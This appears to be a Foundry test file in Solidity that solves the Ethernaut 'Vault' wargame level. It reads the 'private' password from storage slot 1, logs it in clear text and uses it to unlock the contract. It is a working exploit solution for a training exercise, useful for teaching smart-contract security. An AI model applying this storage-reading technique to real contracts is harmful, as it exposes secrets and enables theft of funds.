pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/08-Vault/VaultFactory.sol';
import '../core/Ethernaut.sol';

contract VaultTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testVaultHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    VaultFactory vaultFactory = new VaultFactory();
    ethernaut.registerLevel(vaultFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(vaultFactory);
    Vault vaultContract = Vault(payable(levelAddress));

    //assertEq(vaultContract.locked(), true);

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    /*
      Slot data for contract:
        bool    ==  1 byte, slot 0
        bytes32 == 32 bytes, forces into slot 1
    */
    bytes32 passwordSlot = bytes32(uint256(1));
    
    // accessing slots in foundry, we use vm load
    // on live, can we use(?): 
    //   https://coinsbench.com/solidity-layout-and-access-of-storage-variables-simply-explained-1ce964d7c738
    bytes32 storagePassword = vm.load(address(vaultContract), passwordSlot);
    emit log_named_bytes32(
      'Password loaded from slot 1', 
      storagePassword
    );
    emit log_named_string(
      'Clear text password loaded from slot 1',
      bytes32ToString(storagePassword)
    );

    // Finally, unlock the contract with the obtained password
    vaultContract.unlock(storagePassword);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }

  // utility: https://ethereum.stackexchange.com/questions/2519/how-to-convert-a-bytes32-to-string
  function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {
    uint8 i = 0;
    while(i < 32 && _bytes32[i] != 0) {
      i++;
    }

    bytes memory bytesArray = new bytes(i);
    for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
      bytesArray[i] = _bytes32[i];
    }

    return string(bytesArray);
  }
}

